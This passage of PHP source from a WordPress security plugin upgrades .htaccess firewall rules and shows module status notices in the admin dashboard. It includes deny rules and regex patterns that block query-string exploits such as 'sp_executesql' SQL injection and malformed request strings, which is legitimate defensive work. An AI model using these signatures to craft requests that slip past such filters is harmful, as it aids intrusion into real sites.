			$stringReplace = preg_replace('/RewriteCond\s%{QUERY_STRING}\s\(sp_executesql\)\s\[NC\]\s*(.*)\s*RewriteCond\s%{REQUEST_FILENAME}\s!-f\s*RewriteCond\s%{REQUEST_FILENAME}\s!-d\s*RewriteRule\s\.(.*)\/index\.php\s\[L\]/', "RewriteCond %{QUERY_STRING} (sp_executesql) [NC]\nRewriteRule ^(.*)$ - [F,L]\n# END BPSQSE BPS QUERY STRING EXPLOITS\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . ".$bps_get_wp_root_secure."index.php [L]\n# WP REWRITE LOOP END", $stringReplace);
		}

		// Clean up - replace 3 and 4 multiple newlines with 1 newline
		if ( preg_match('/(\n\n\n|\n\n\n\n)/', $stringReplace, $matches) ) {			
			$stringReplace = preg_replace("/(\n\n\n|\n\n\n\n)/", "\n", $stringReplace);
		}
		// remove duplicate referer lines
		if ( preg_match( $pattern8, $stringReplace, $matches ) ) {
$stringReplace = preg_replace("/\[NC\]\s*RewriteCond\s%{HTTP_REFERER}\s\^\.\*(.*)\.\*\s*(.*)\s*(.*)\s*(.*)\s*(.*)\s*(.*)\s*RewriteRule\s\.\s\-\s\[S=1\]/", "[NC]\nRewriteCond %{HTTP_REFERER} ^.*$bps_get_domain_root.*\nRewriteRule . - [S=1]", $stringReplace);
		}
		
			file_put_contents($filename, $stringReplace);

		if ( @$permsRootHtaccess == '0644' && @substr( $sapi_type, 0, 6 ) != 'apache' && $options2['bps_root_htaccess_autolock'] != 'Off' || $Flockoptions['bps_lock_root_htaccess'] == 'yes') {			
			@chmod($filename, 0404);
		}
			
			@copy($filename, $htaccessARRoot);
		
		if ( getBPSInstallTimeTXT() == getBPSRootHtaccessLasModTime_minutes() || getBPSInstallTime_plusone() == getBPSRootHtaccessLasModTime_minutes() ) {
			
			$bps_root_upgrade = 'upgrade';
			
			$pos = strpos( $check_string, 'IMPORTANT!!! DO NOT DELETE!!! - B E G I N Wordpress' );
			
			if ( $pos === false ) {
 		
				$updateText = '<div class="update-nag" style="float:left;background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="blue">'.__("The BPS Pro Automatic htaccess File Update Completed Successfully!", 'bulletproof-security').'</font></div><br><br>';
				print($updateText);	
			}			
			
			// Create /wp-includes/version.php ARQ exclude rule
			bps_wp_versionphp_exclude_rule();
			// Recreate the User Agent filters in the 403.php file on BPS upgrade
			bpsPro_autoupdate_useragent_filters();
			// BPS Pro 9.1 synchronize DB timestamps to GMT file timestamps
			bpsPro_sync_time_gmt();
			// Delete all the old plugin api junk content in this transient
			delete_transient( 'bulletproof-security_info' );
			// Delete Plugin Firewall Override DB Table if it exists
			$Ptable_name = $wpdb->prefix . "bpspro_pfw_override";
			$wpdb->query("DROP TABLE IF EXISTS $Ptable_name");
			// Delete PFW-TestMode.php file if it exists
			$PFWTestMode = WP_CONTENT_DIR . '/bps-backup/test-mode/PFW-TestMode.php';
			if ( file_exists($PFWTestMode) ) {
				unlink($PFWTestMode);
			}
			// Delete Test Mode DB option if it exists
			delete_option('bulletproof_security_options_pfirewall_TMode');
			// Delete PFW dismiss notice option if it exists
			delete_option('bulletproof_security_options_pfirewall_plugins'); 
			
			// Update BPS DB option - WP version matches the current version of WP & reset the last modified time in DB
			$gmt_offset = get_option( 'gmt_offset' ) * 3600;
			$versionphp = ABSPATH . 'wp-includes/version.php';	
			$last_modified_time_versionphp = date("F d Y H:i", filemtime($versionphp) + $gmt_offset);
			$bps_option_name12 = 'bulletproof_security_options_wp_version';
			$bps_new_value12 = $wp_version;	
			$bps_new_value12_1 = date("F d Y H:i", filemtime($versionphp) + $gmt_offset + 900);	
			
			$BPS_Options12 = array( 'bps_wp_version' => $bps_new_value12, 'bps_wp_version_last_modified_time' => $bps_new_value12_1 );	
	
			if ( ! get_option( $bps_option_name12 ) ) {	
		
				foreach( $BPS_Options12 as $key => $value ) {
					update_option('bulletproof_security_options_wp_version', $BPS_Options12);
				}
			
			} else {

				foreach( $BPS_Options12 as $key => $value ) {
					update_option('bulletproof_security_options_wp_version', $BPS_Options12);
				}	
			}
		} // end up upgrade processing
		break;		
	case strpos( $check_string, "BULLETPROOF PRO $bpspro_version" ) && strpos( $check_string, "BPSQSE" ):		

			$RBM = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php" title="Root Folder BulletProof Mode" style="text-decoration:none;">'.__('RBM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On', 'bulletproof-security').'</strong></font>';
			$RBM_str = str_replace( "BULLETPROOF PRO $bpspro_version SECURE .HTACCESS", "BPS Pro $bpspro_version $RBM", $section );
			
			echo '<div id="bps-status-display" style="float:left;">'.$RBM_str.'</div>';
		
		break;
	default:
		
	if ( $bps_root_upgrade != 'upgrade' ) {
	
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="red">'.__('BPS Pro Alert! Your site does not appear to be protected by BulletProof Security', 'bulletproof-security').'</font><br>'.__('Go to the ', 'bulletproof-security').'<a href="admin.php?page=bulletproof-security/admin/core/options.php">'.__('Security Modes page', 'bulletproof-security').'</a>'.__(' and click the Create secure.htaccess File AutoMagic button and Activate Root Folder BulletProof Mode.', 'bulletproof-security').'<br>'.__('If your site is in Default Mode then it is NOT protected by BulletProof Security. Check the BPS ', 'bulletproof-security').'<a href="admin.php?page=bulletproof-security/admin/core/options.php#bps-tabs-2">'.__('Security Status page', 'bulletproof-security').'</a>'.__(' to view your BPS Security Status information.', 'bulletproof-security').'</div>';
		echo $text;
	}
}}}}}}

add_action('admin_notices', 'bps_status_WP_Dashboard');

/** IMPORTANT function that touches the bulletproof-security.php file on new installs & upgrades  **/
// Compare timestamp for /admin/bps_php_error.log & bulletproof-security.php
// If they match: Touch bulletproof-security.php - 1 hour
function bpsPro_install_upgrade_Touch() {

	if ( current_user_can('manage_options') ) {
	
		$ELog_mod_time = get_option('bulletproof_security_options_elog');

	if ( $ELog_mod_time['bps_error_log_date_mod'] != '' && strcmp( bps_getPhpELogLastMod_minutes(), getBPSInstallTime() ) == 0 ) {	

		$bulletproofSecurityPhp = WP_PLUGIN_DIR . '/bulletproof-security/bulletproof-security.php';	
		$timeMinusOneHour = time() - 3600;

		// cleanup for the old dot in the php error log timestamp
		if ( preg_match( '/\./', $ELog_mod_time['bps_error_log_date_mod'], $matches ) ) {
			$BPS_Options = array( 'bps_error_log_date_mod' => str_replace( '.', "", $ELog_mod_time['bps_error_log_date_mod'] ) );
			update_option('bulletproof_security_options_elog', $BPS_Options);
		}
		
		touch($bulletproofSecurityPhp, $timeMinusOneHour);
	}
	}
}
add_action('admin_notices', 'bpsPro_install_upgrade_Touch');

// BPS Pro 9.1/9.2: Synchronize DB timestamps to GMT. Only needs to happen once.
// Actually need to add additional code for the time changes - standard and daylight savings
function bpsPro_sync_time_gmt() {
$GMT_time = get_option('bulletproof_security_options_GMT');

	if ( ! $GMT_time['bps_gmt_timestamp'] || $GMT_time['bps_gmt_timestamp'] != 'GMT' ) {
	
	$ARQ_db_options = array( 'bps_arcm_log_date_mod' => bps_getARCMLogLastMod_wp_secs() );
	update_option('bulletproof_security_options_ARCM_log', $ARQ_db_options);
	
	$php_db_options = array( 'bps_error_log_date_mod' => bps_getPhpELogLastMod_smonitor() );
	update_option('bulletproof_security_options_elog', $php_db_options);	

	$LSM_db_options = array( 'bps_login_security_db_mod_time' => bps_getLoginSecurityResetFileLastMod_secs() );
	update_option('bulletproof_security_options_login_alerts', $LSM_db_options);	

	$SecLog_db_options = array( 'bps_security_log_date_mod' => bps_getSecurityLogLastMod_secs() );
	update_option('bulletproof_security_options_Security_log', $SecLog_db_options);	

	$DBM_db_options = array( 'bps_dbm_log_date_mod' => bpsPro_DBM_LogLastMod_wp_secs() );
	update_option('bulletproof_security_options_DBM_log', $DBM_db_options);	

	$DBB_db_options = array( 'bps_dbb_log_date_mod' => bpsPro_DBB_LogLastMod_wp_secs() );
	update_option('bulletproof_security_options_DBB_log', $DBB_db_options);	
	
	$GMT_Options = array( 'bps_gmt_timestamp' => 'GMT' );	
	
		foreach( $GMT_Options as $key => $value ) {
			update_option('bulletproof_security_options_GMT', $GMT_Options);
		}	
	}
}

// S-Monitor Display - wp-admin htaccess - BPS Status and Alerts in WP Dashboard - wpOn
function bps_status_wpadmin_WP_Dashboard() {
$options = get_option('bulletproof_security_options_monitor');
	
	if ( current_user_can('manage_options') && $options['bps_security_status'] == 'wpOn' ) {
		
	global $bpspro_version, $bpspro_last_version, $aitpro_bullet, $pagenow;

	if ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		return;
	}
	
	if ( esc_html($_SERVER['REQUEST_METHOD']) != 'POST' && esc_html($_SERVER['QUERY_STRING']) != 'page=bulletproof-security/admin/system-info/system-info.php' ) {
			
	$BPS_wpadmin_Options = get_option('bulletproof_security_options_htaccess_res');
	$GDMW_options = get_option('bulletproof_security_options_GDMW');	
	
	if ( $BPS_wpadmin_Options['bps_wpadmin_restriction'] == 'disabled'  || $GDMW_options['bps_gdmw_hosting'] == 'yes' ) {
		return;
	}

	$filename = ABSPATH . 'wp-admin/.htaccess';
	$permsHtaccess = @substr(sprintf('%o', fileperms($filename)), -4);
	$check_string = @file_get_contents($filename);
	$section = @file_get_contents($filename, NULL, NULL, 3, 50);
	$htaccessARwpadmin = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-admin/wpadmin.htaccess';
	$bps_wpadmin_upgrade = '';
	
	$pattern10a = '/RewriteCond\s%\{THE_REQUEST\}\s(.*)\?(.*)\sHTTP\/\s\[NC,OR\]\s*RewriteCond\s%\{THE_REQUEST\}\s(.*)\*(.*)\sHTTP\/\s\[NC,OR\]/';
	$pattern10b = '/RewriteCond\s%\{THE_REQUEST\}\s.*\?\+\(%20\{1,\}.*\s*RewriteCond\s%\{THE_REQUEST\}\s.*\+\(.*\*\|%2a.*\s\[NC,OR\]/';	
	$pattern10c = '/RewriteCond\s%\{THE_REQUEST\}\s\(\\\\?.*%2a\)\+\(%20\+\|\\\\s\+.*HTTP\(:\/.*\[NC,OR\]/';
	$pattern1 = '/(\[|\]|\(|\)|<|>)/s';
	
	if ( !file_exists($filename) ) {
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="red">'.__('BPS Pro Alert! An htaccess file was NOT found in your wp-admin folder. Check the BPS Pro ', 'bulletproof-security').'<a href="admin.php?page=bulletproof-security/admin/core/options.php#bps-tabs-2">'.__('Security Status page', 'bulletproof-security').'</a>'.__(' for more specific information.', 'bulletproof-security').'</font></div>';
		echo $text;
	
	} else {
	
	if ( file_exists($filename) ) {

switch ( $bpspro_version ) {
    case $bpspro_last_version:
		if ( strpos( $check_string, "BULLETPROOF PRO $bpspro_last_version" ) && strpos( $check_string, "BPSQSE-check" ) ) {
			// echo or print for testing
		}
		break;
    case ! strpos( $check_string, "BULLETPROOF" ):

		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="red">'.__('BPS Pro Alert! Your wp-admin folder may not be protected by BulletProof Security', 'bulletproof-security').'</font><br>'.__('The BPS version: BULLETPROOF PRO x.x WP-ADMIN SECURE .HTACCESS line of code was not found at the top of your wp-admin htaccess file.', 'bulletproof-security').'<br>'.__('The BPS version line of code MUST be at the very top of your wp-admin htaccess file.', 'bulletproof-security').'<br>'.__('Go to the ', 'bulletproof-security').'<a href="admin.php?page=bulletproof-security/admin/core/options.php">'.__('Security Modes page', 'bulletproof-security').'</a>'.__(' and Activate wp-admin Folder BulletProof Mode.', 'bulletproof-security').'</div>';
		echo $text;

		break;
	case ! strpos( $check_string, "BULLETPROOF PRO $bpspro_version" ) && strpos( $check_string, "BPSQSE-check" ):
			
			if ( @substr( $sapi_type, 0, 6 ) != 'apache' || @$permsHtaccess != '0666' || @$permsHtaccess != '0777' ) { // Windows IIS, XAMPP, etc
				@chmod($filename, 0644);
			}
			
			$stringReplace = @file_get_contents($filename);
			$stringReplace = preg_replace('/BULLETPROOF PRO(.*)WP-ADMIN SECURE .HTACCESS/s', "BULLETPROOF PRO $bpspro_version WP-ADMIN SECURE .HTACCESS", $stringReplace);
		
		if ( preg_match( $pattern10a, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace( $pattern10a, "RewriteCond %{THE_REQUEST} (\?|\*|%2a)+(%20+|\\\\\s+|%20+\\\\\s+|\\\\\s+%20+|\\\\\s+%20+\\\\\s+)HTTP(:/|/) [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern10b, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace( $pattern10b, "RewriteCond %{THE_REQUEST} (\?|\*|%2a)+(%20+|\\\\\s+|%20+\\\\\s+|\\\\\s+%20+|\\\\\s+%20+\\\\\s+)HTTP(:/|/) [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern10c, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace( $pattern10c, "RewriteCond %{THE_REQUEST} (\?|\*|%2a)+(%20+|\\\\\s+|%20+\\\\\s+|\\\\\s+%20+|\\\\\s+%20+\\\\\s+)HTTP(:/|/) [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern1, $stringReplace, $matches ) ) {
			$stringReplace = str_replace("RewriteCond %{QUERY_STRING} ^.*(\[|\]|\(|\)|<|>).* [NC,OR]", "RewriteCond %{QUERY_STRING} ^.*(\(|\)|<|>).* [NC,OR]", $stringReplace);		
		}
			
			file_put_contents($filename, $stringReplace);
			@copy($filename, $htaccessARwpadmin);	

		if ( getBPSInstallTimeTXT() == getBPSwpadminHtaccessLasModTime_minutes() || getBPSInstallTime_plusone() == getBPSwpadminHtaccessLasModTime_minutes() ) {
			//print("Testing wp-admin auto-update");	
			$bps_wpadmin_upgrade = 'upgrade';
		
		} // end upgrade processing			
		break;		
	case strpos( $check_string, "BULLETPROOF PRO $bpspro_version" ) && strpos( $check_string, "BPSQSE-check" ):		
			
			$WBM = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/core/options.php#WBM-Link" title="wp-admin Folder BulletProof Mode" style="text-decoration:none;">'.__('WBM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On', 'bulletproof-security').'</strong></font>';	
			$WBM_str = str_replace( "BULLETPROOF PRO $bpspro_version WP-ADMIN SECURE .HTACCESS", "$WBM", $section);
			
			echo '<div id="bps-status-display" style="float:left;">'.$WBM_str;
		
			if ( $options['bps_autorestore_status'] == 'wpOn' || $options['bps_dbm_status'] == 'wpOn' || $options['bps_dbb_status'] == 'wpOn' || $options['bps_plugin_firewall_status'] == 'wpOn' || $options['bps_UAEG_status'] == 'wpOn' || $options['bps_login_security_status'] == 'wpOn' || $options['bps_jtc_antispam_status'] == 'wpOn' ) {

				echo '</div>';	

			} else {
				
				echo '</div><div style="clear:both;"></div>';	// 	
			}			

		break;
	default:
		
	if ( $bps_wpadmin_upgrade != 'upgrade' ) {
	
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="red">'.__('BPS Pro Alert! A valid BPS Pro htaccess file was NOT found in your wp-admin folder', 'bulletproof-security').'</font><br>'.__('BulletProof Mode for the wp-admin folder should also be activated when you have BulletProof Mode activated for the Root folder.', 'bulletproof-security').'<br>'.__('Check the BPS ', 'bulletproof-security').'<a href="admin.php?page=bulletproof-security/admin/core/options.php#bps-tabs-2">'.__('Security Status page', 'bulletproof-security').'</a>'.__(' to view your BPS Security Status information.', 'bulletproof-security').'</div>';
		echo $text;
	}
}}}}}}

add_action('admin_notices', 'bps_status_wpadmin_WP_Dashboard');

// S-Monitor & AutoRestore Status display WP Dashboard - wpOn
function bps_ARCM_admin_notice_status_wp() {
$options = get_option('bulletproof_security_options_monitor');
	
	if ( current_user_can('manage_options') && $options['bps_autorestore_status'] == 'wpOn' ) {
		
	global $pagenow;
	if ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		return;
	}
	
	if ( esc_html($_SERVER['REQUEST_METHOD']) != 'POST' && esc_html($_SERVER['QUERY_STRING']) != 'page=bulletproof-security/admin/system-info/system-info.php' ) {

		echo '<div id="bps-status-display" style="float:left;">';
		bpsProARCMStatus();		
		
		if ( $options['bps_dbm_status'] == 'wpOn' || $options['bps_dbb_status'] == 'wpOn' || $options['bps_plugin_firewall_status'] == 'wpOn' || $options['bps_UAEG_status'] == 'wpOn' || $options['bps_login_security_status'] == 'wpOn' || $options['bps_jtc_antispam_status'] == 'wpOn' ) {
			
			echo '</div>';

		} else {
			
			echo '</div><div style="clear:both;"></div>';			

		}
	}
	}
}
add_action('admin_notices', 'bps_ARCM_admin_notice_status_wp');

// AutoRestore/Quarantine Dashboard Status: display - for both wpOn and bpsOn
function bpsProARCMStatus() {
global $aitpro_bullet;

	if ( current_user_can('manage_options') ) {
	
	if ( !get_option('bulletproof_security_options_ARCM' ) ) {
		$text = '<br><a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine">'.__('ARQ', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('AutoRestore|Quarantine Options Have Not Been Selected and Saved Yet ', 'bulletproof-security').'</strong></font><strong><a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php">'.__('Click Here', 'bulletproof-security').'</a></strong>';
		echo $text;
	} 
	
	$options = get_option('bulletproof_security_options_ARCM');	
	
	if ( $options['bps_autorestore_cron_override'] == 'On' ) {	
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="blue"><strong>'.__('Override On ', 'bulletproof-security').'</strong></font>';
		echo $text;
		return;
	}

	if ( $options['bps_autorestore_cron'] == 'Off' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('Off ', 'bulletproof-security').'</strong></font>';
		echo $text;

	} else {
	
	if ( $options['bps_autorestore_cron'] == 'On' ) {
	
		$date_format = 'g:i A';
		$gmt_offset = get_option( 'gmt_offset' ) * 3600;
		$bpsCronCheck = wp_get_schedule( 'bpsPro_AutoRestore_check' );
		$ARQ_cron_time = wp_next_scheduled( 'bpsPro_AutoRestore_check' );
		$arq_next_check = date_i18n( $date_format, $ARQ_cron_time + $gmt_offset );

	if ( $bpsCronCheck == 'minutes_1' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 1 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_2' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 2 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_3' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 3 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_4' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 4 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_5' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 5 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_10' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 10 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_15' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On - 15 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_30' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 30 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_60' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/autorestore/autorestore.php" title="AutoRestore|Quarantine" style="text-decoration:none;">'.__('ARQ', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 60 Min : ', 'bulletproof-security').$arq_next_check.'</strong></font>';
		echo $text;
	}
	}
	}
	}
}

// S-Monitor - DB Monitor Status display WP Dashboard - wpOn
function bps_DBM_admin_notice_status_wp() {
$options = get_option('bulletproof_security_options_monitor');
	
	if ( current_user_can('manage_options') && $options['bps_dbm_status'] == 'wpOn' ) {
		
	global $pagenow;
	if ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		return;
	}

	if ( esc_html($_SERVER['REQUEST_METHOD']) != 'POST' && esc_html($_SERVER['QUERY_STRING']) != 'page=bulletproof-security/admin/system-info/system-info.php' ) {		
		
		echo '<div id="bps-status-display" style="float:left;">';
		bpsProDBMStatus();
		
		if ( $options['bps_dbb_status'] == 'wpOn' || $options['bps_plugin_firewall_status'] == 'wpOn' || $options['bps_UAEG_status'] == 'wpOn' || $options['bps_login_security_status'] == 'wpOn' || $options['bps_jtc_antispam_status'] == 'wpOn' ) {
			
			echo '</div>';

		} else {
			
			echo '</div><div style="clear:both;"></div>';			
		}
	}
	}
}
add_action('admin_notices', 'bps_DBM_admin_notice_status_wp');

// S-Monitor - DB Monitor Status display WP Dashboard - for both wpOn and bpsOn
function bpsProDBMStatus() {
	
	if ( current_user_can('manage_options') ) {
	
	global $aitpro_bullet;
	$options = get_option('bulletproof_security_options_db_monitor');

	if ( $options['bps_db_monitor_cron'] == 'Off' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-monitor/db-monitor.php" title="Database Monitor" style="text-decoration:none;">'.__('DBM', 'bulletproof-security').'</a>: <font color="red"><strong>'.__('Off ', 'bulletproof-security').'</strong></font>';
		echo $text;

	} else {
	
	if ( $options['bps_db_monitor_cron'] == 'On' ) {
	
		$date_format = 'g:i A';
		$gmt_offset = get_option( 'gmt_offset' ) * 3600;
		$bpsCronCheck = wp_get_schedule( 'bpsPro_DBM_check' );
		$DBM_cron_time = wp_next_scheduled( 'bpsPro_DBM_check' );
		$dbm_next_check = date_i18n( $date_format, $DBM_cron_time + $gmt_offset );

	if ( $bpsCronCheck == 'minutes_1' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-monitor/db-monitor.php" title="Database Monitor" style="text-decoration:none;">'.__('DBM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 1 Min : ', 'bulletproof-security').$dbm_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_5' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-monitor/db-monitor.php" title="Database Monitor" style="text-decoration:none;">'.__('DBM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 5 Min : ', 'bulletproof-security').$dbm_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_10' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-monitor/db-monitor.php" title="Database Monitor" style="text-decoration:none;">'.__('DBM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 10 Min : ', 'bulletproof-security').$dbm_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_15' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-monitor/db-monitor.php" title="Database Monitor" style="text-decoration:none;">'.__('DBM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 15 Min : ', 'bulletproof-security').$dbm_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_30' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-monitor/db-monitor.php" title="Database Monitor" style="text-decoration:none;">'.__('DBM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 30 Min : ', 'bulletproof-security').$dbm_next_check.'</strong></font>';
		echo $text;
	}
	if ( $bpsCronCheck == 'minutes_60' ) {
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-monitor/db-monitor.php" title="Database Monitor" style="text-decoration:none;">'.__('DBM', 'bulletproof-security').'</a>: <font color="green"><strong>'.__('On : 60 Min : ', 'bulletproof-security').$dbm_next_check.'</strong></font>';
		echo $text;
	}
	}
	}
	}
}

// S-Monitor - DB Backup Status display WP Dashboard - wpOn
function bps_DBB_admin_notice_status_wp() {
$options = get_option('bulletproof_security_options_monitor');
	
	if ( current_user_can('manage_options') && $options['bps_dbb_status'] == 'wpOn' ) {
		
	global $pagenow;
	if ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		return;
	}

	if ( esc_html($_SERVER['REQUEST_METHOD']) != 'POST' && esc_html($_SERVER['QUERY_STRING']) != 'page=bulletproof-security/admin/system-info/system-info.php' ) {		
		
		echo '<div id="bps-status-display" style="float:left;">';
		bpsProDBBStatus();
		
		if ( $options['bps_plugin_firewall_status'] == 'wpOn' || $options['bps_UAEG_status'] == 'wpOn' || $options['bps_login_security_status'] == 'wpOn' || $options['bps_jtc_antispam_status'] == 'wpOn' ) {
			
			echo '</div>';

		} else {
			
			echo '</div><div style="clear:both;"></div>';			
		}
	}
	}
}
add_action('admin_notices', 'bps_DBB_admin_notice_status_wp');

// S-Monitor - DB Backup Status display WP Dashboard - for both wpOn and bpsOn
// First time installations and upgrades the DB option bps_db_backup_status_display has value "No DB Backups"
// When a Backup Job is created for the first time the value is "Backup Job Created" - one time/one-shot option
// All S-Monitor DB Backup options & DB Backup options are automatically created and saved for new installations and upgrades
function bpsProDBBStatus() {

	if ( current_user_can('manage_options') ) {
	
	global $aitpro_bullet;
	$options = get_option('bulletproof_security_options_monitor');

	if ( $options['bps_dbb_status'] == 'Off' ) {
		return;
	}
	
	$DBBoptions = get_option('bulletproof_security_options_db_backup');	
	
	if ( $DBBoptions['bps_db_backup_status_display'] == 'No DB Backups' ) {
		
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-backup-security/db-backup-security.php" title="Database Backup" style="text-decoration:none;">'.__('DBB', 'bulletproof-security').'</a>: <font color="blue"><strong>'.__('No DB Backups', 'bulletproof-security').'</strong></font>';
		echo $text;
	
	} elseif ( $DBBoptions['bps_db_backup_status_display'] == 'Backup Job Created' ) {
		
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-backup-security/db-backup-security.php" title="Database Backup" style="text-decoration:none;">'.__('DBB', 'bulletproof-security').'</a>: <font color="blue"><strong>'.__('Backup Job Created', 'bulletproof-security').'</strong></font>';
		echo $text;		
	
	} else {
		
		$text = $aitpro_bullet . '<a href="admin.php?page=bulletproof-security/admin/db-backup-security/db-backup-security.php" title="Database Backup" style="text-decoration:none;">'.__('DBB', 'bulletproof-security').'</a>: <font color="green"><strong>'.$DBBoptions['bps_db_backup_status_display'].'</strong></font>';
		echo $text;
	}
	}
}

// S-Monitor - Plugin Firewall Status display WP Dashboard - wpOn
function bps_PFWAP_admin_notice_status_wp() {
$options = get_option('bulletproof_security_options_monitor');
	
	if ( current_user_can('manage_options') && $options['bps_plugin_firewall_status'] == 'wpOn' ) {
		
	global $pagenow;
	if ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		return;
	}

	if ( esc_html($_SERVER['REQUEST_METHOD']) != 'POST' && esc_html($_SERVER['QUERY_STRING']) != 'page=bulletproof-security/admin/system-info/system-info.php' ) {		
		
		echo '<div id="bps-status-display" style="float:left;">';
		bpsProPFWAPStatus();
		
	if ( $options['bps_UAEG_status'] == 'wpOn' || $options['bps_login_security_status'] == 'wpOn' || $options['bps_jtc_antispam_status'] == 'wpOn' ) {
			
			echo '</div>';

		} else {
			
			echo '</div><div style="clear:both;"></div>';			
		}
	}
	}
}
add_action('admin_notices', 'bps_PFWAP_admin_notice_status_wp');

// S-Monitor - Plugin Firewall Status display WP Dashboard - for both wpOn and bpsOn
